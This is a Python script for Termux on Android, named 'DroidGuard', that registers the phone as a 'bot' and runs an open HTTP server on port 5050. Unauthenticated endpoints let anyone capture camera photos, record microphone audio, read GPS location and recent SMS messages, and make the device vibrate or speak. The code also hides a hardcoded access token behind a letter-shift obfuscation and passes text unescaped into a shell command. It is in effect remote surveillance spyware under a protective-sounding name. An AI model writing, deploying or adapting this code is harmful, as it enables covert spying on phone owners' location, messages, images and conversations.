import os, json, time, subprocess, base64, random, string, threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

TOKEN = None
for t in ["now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da"]:
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else: r += c
    TOKEN = r

REPO = "gynbetfc/droidguard-site"
HEADERS_GH = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
PASTA = "/sdcard/Download/DroidGuard"
CONFIG = "/data/data/com.termux/files/home/.droidguard_id"
os.makedirs(PASTA, exist_ok=True)

if os.path.exists(CONFIG):
    with open(CONFIG) as f: BOT_ID = f.read().strip()
else:
    BOT_ID = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
    with open(CONFIG, 'w') as f: f.write(BOT_ID)

print(f"🟢 DROIDGUARD - ID: {BOT_ID}")
print(f"📁 Pasta: {PASTA}")

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=15).strip()
    except: return ""

def status():
    b = shell("termux-battery-status")
    bat = ""
    if b:
        try: bat = str(json.loads(b).get("percentage","?")) + "%"
        except: pass
    g = shell("termux-location")
    gps = {}
    if g:
        try:
            gd = json.loads(g)
            gps = {"lat": gd.get("latitude",0), "lng": gd.get("longitude",0)}
        except: pass
    return json.dumps({"time": datetime.now().strftime("%H:%M:%S"), "bateria": bat, "gps": gps, "id": BOT_ID})

def foto(cam=1):
    T = datetime.now().strftime("%H%M%S")
    path = f"{PASTA}/foto_{T}.jpg"
    shell(f"termux-camera-photo -c {cam} {path}")
    time.sleep(1.5)
    if os.path.exists(path) and os.path.getsize(path) > 100:
        with open(path, 'rb') as f:
            return base64.b64encode(f.read()).decode()
    return ""

def audio():
    T = datetime.now().strftime("%H%M%S")
    path = f"{PASTA}/audio_{T}.aac"
    shell(f"termux-microphone-record -f {path} -l 5")
    time.sleep(7)
    if os.path.exists(path) and os.path.getsize(path) > 100:
        with open(path, 'rb') as f:
            return base64.b64encode(f.read()).decode()
    return ""

def vibrar():
    shell("termux-vibrate -d 500")
    return "ok"

def falar(texto="Ola"):
    shell(f"termux-tts-speak \"{texto}\"")
    return "ok"

def listar_sms():
    s = shell("termux-sms-list -l 5")
    return s if s else "[]"

# Servidor HTTP
class Handler(BaseHTTPRequestHandler):
    def _send(self, data, code=200, ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        if isinstance(data, str): data = data.encode()
        self.wfile.write(data)
    
    def do_GET(self):
        if self.path == "/id":
            self._send(json.dumps({"id": BOT_ID}))
        
        elif self.path == "/status":
            self._send(status())
        
        elif self.path == "/foto":
            res = foto(1)
            self._send(json.dumps({"foto": res, "id": BOT_ID}))
        
        elif self.path == "/audio":
            res = audio()
            self._send(json.dumps({"audio": res, "id": BOT_ID}))
        
        elif self.path == "/vibrar":
            vibrar()
            self._send(json.dumps({"ok": True}))
        
        elif self.path == "/sms":
            res = listar_sms()
            self._send(json.dumps({"sms": json.loads(res) if res else []}))
        
        elif self.path == "/falar":
            falar("Teste de voz")
            self._send(json.dumps({"ok": True}))
        
        else:
            self._send(json.dumps({"msg": "DroidGuard Online", "id": BOT_ID}))

print("🌐 Servidor na porta 5050")
HTTPServer(("0.0.0.0", 5050), Handler).serve_forever()
